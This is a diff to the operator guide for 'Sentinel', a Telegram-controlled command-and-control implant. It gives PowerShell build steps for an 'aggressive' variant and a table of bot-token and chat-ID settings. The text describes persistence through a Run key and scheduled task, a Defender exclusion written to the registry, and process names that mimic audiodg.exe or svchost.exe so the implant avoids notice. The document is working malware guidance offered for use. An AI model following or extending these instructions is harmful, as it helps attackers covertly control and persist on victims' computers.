@@ -33,12 +33,9 @@ The operator device is where you stage the binary, configure it, and watch the b
 ### 2.1 Build the binary
 From the repo root:
 ```powershell
-.\build_sentinel.ps1 -Tg -Variant aggressive
+.\build_sentinel.ps1 -Tg -Variant aggressive -BotToken "<BOT_TOKEN_FROM_BOTFATHER>" -ChatId "<OPERATOR_CHAT_ID>"
 ```
-Produces `build\sentinel_tg_aggressive.exe` (404 KB). The `-d:variant_aggressive` flag enables:
-- Auto-persist on first connect (Run key + scheduled task)
-- Self-adds install path to Defender's exclusion list (direct registry write, no PowerShell spawn)
-- Same IAT as silent variant: only KERNEL32 / msvcrt / USER32
+Produces `build\sentinel_tg_aggressive.exe`. Telegram credentials can also be supplied at runtime with `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID`; the build parameters are now wired into the generated include.
 
 ### 2.2 Verify the IAT
 ```powershell
@@ -57,7 +54,7 @@ $env:C2_LOG_FILE = "$env:TEMP\sentinel_test.log"
 $env:C2_POLL_INTERVAL = "2"
 .\build\sentinel_tg_aggressive.exe
 ```
-Within ~3-4 seconds you should see the **"SentinelC2 / Sentinel online"** message in your Telegram chat with @IamSentinal_bot. Send `/sysinfo` to the bot and the agent replies with the host info.
+Within ~3-4 seconds you should see the **"sentinel online"** message in your Telegram chat with @IamSentinal_bot. Send `/sysinfo` to the bot and the agent replies with the host info.
 
 To stop the test agent: `Stop-Process -Name sentinel_tg_aggressive -Force`.
 
@@ -96,24 +93,20 @@ Default paths chosen to look like normal Windows components:
 ```
 The `audiodg.exe` filename is intentional — it's a real Windows process (Windows Audio Device Graph Isolation) that runs in user sessions, so the process listing won't immediately stand out.
 
-For a quieter install, override via env vars:
-```powershell
-$env:C2_INSTALL_DIR  = "C:\ProgramData\Microsoft\Network\Connections\Cm"
-$env:C2_INSTALL_NAME = "svchost.exe"
-```
+The primary Sentinel Telegram path uses its compiled install layout; `C2_INSTALL_DIR` and `C2_INSTALL_NAME` overrides belong to the separate legacy `telegram/agent_telegram.nim` agent.
 
 ---
 
 ## 4. Configuring the agent at runtime
 
-The agent reads its config from these env vars on first run. **Don't bake the token into the binary** — set them at deploy time so the token can be rotated without rebuilding.
+The agent reads its Telegram configuration from these environment variables at startup. For rotation without rebuilding, prefer `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID`; the build script now also wires its `-BotToken`/`-ChatId` parameters into a generated include.
 
 | Env var | Required | Default | Notes |
 |---|---|---|---|
 | `TELEGRAM_BOT_TOKEN` | yes | (none) | from @BotFather |
 | `TELEGRAM_CHAT_ID` | yes | (none) | your user id (<OPERATOR_CHAT_ID>) |
-| `C2_INSTALL_DIR` | no | `%ProgramData%\Realtek\Audio` | self-copy target |
-| `C2_INSTALL_NAME` | no | `audiodg.exe` | self-copy filename |
+| `C2_INSTALL_DIR` | no | compiled primary Sentinel layout | only the legacy Telegram agent honors this |
+| `C2_INSTALL_NAME` | no | compiled primary Sentinel layout | only the legacy Telegram agent honors this |
 | `C2_POLL_INTERVAL` | no | 3 | base poll seconds (min 1) |
 | `C2_POLL_TIMEOUT` | no | 30 | long-poll HTTP timeout (min 5) |
 | `TELEGRAM_PROXY` | no | (none) | `http://host:port` if egress filtered |
